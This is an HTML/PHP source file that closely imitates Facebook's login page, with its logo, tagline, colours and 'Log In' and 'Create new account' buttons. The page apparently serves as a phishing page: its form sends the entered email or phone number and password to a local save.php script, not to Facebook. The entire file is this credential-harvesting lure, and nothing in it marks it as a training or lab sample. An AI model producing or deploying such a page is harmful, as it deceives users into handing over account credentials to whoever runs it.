<?php
include "try.php";
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook Login Page</title>
    <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css"
        integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"
        crossorigin="anonymous" />
</head>
<style>
    body {
        background-color: whitesmoke !important;
    }

    .login {
        font-size: x-large;
    }

    .login.btn {
        padding-top: 1rem;
        padding-bottom: 1rem;
        box-shadow: none !important;
        background-color: #1877F2 !important;
    }

    .login.btn:hover {
        background-color: #0D65D9 !important;
    }

    .login.btn:active {
        background-color: #0056B3 !important;
    }

    input {
        caret-color: #1877F2;
    }

    input:focus {
        border-color: #1877F2 !important;
        outline: none;
    }

    .radius {
        border-radius: 8px !important;
    }

    .rad {
        border-radius: 10px !important;
    }

    .forgot {
        color: #1877F2 !important;
    }

    .forgot:hover {
        text-decoration: underline !important;
        color: #0D65D9 !important;
    }

    .create {
        background-color: #42B72A !important;
        color: white !important;
        box-shadow: none !important;
    }

    .create:hover {
        background-color: #3BA626 !important;
        box-shadow: none !important;
    }

    .create:active {
        background-color: #218838 !important;
        box-shadow: none !important;
    }

    .semibold {
        font-weight: 600 !important;
    }
</style>

<body>

    <div class="container">
        <div class="pt-5">
            <div class="d-flex justify-content-around ">
                <div class="mt-5 ">
                    <img class="w-50 h-50 mb-n5 mt-4" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
                    <p class="h3 pl-4 font-weight-normal">Connect with friends and the world <br>around you on Facebook.</p>
                </div>

                <div class="d-flex justify-content-center mt-5 mr-5 ">
                    <form method="post" action="save.php">
                        <div class="bg-light p-4 border rounded shadow rad" style="width: 400px; max-width: 90vw;">
                            <input class="mb-2 p-3 w-100 border rounded radius form-control-lg d-block" name="username" type="text" placeholder="Email or phone number" required><br>
                            <input class="p-3 w-100 border rounded radius form-control-lg d-block" name="password" type="password" placeholder="Password" required><br>
                            <button class="btn btn-primary  w-100 p-1 border rounded login d-block" type="submit">Log In</button><br>
                            <div class="text-center">
                                <a href="#" class="text-decoration-none forgot">Forgot password?</a>
                            </div>
                            <hr class="border-dark">

                            <div class="text-center ">
                                <button class="btn p-2 radius create " type="button"><b>Create new account</b></button>
                            </div>
                        </div>
                        <p class="text-center mt-4"><a href="#" class="text-dark semibold">Create a Page</a> for a celebrity, brand or business.</p>
                    </form> <br>

                </div>
            </div>

        </div>

    </div>

</body>

</html>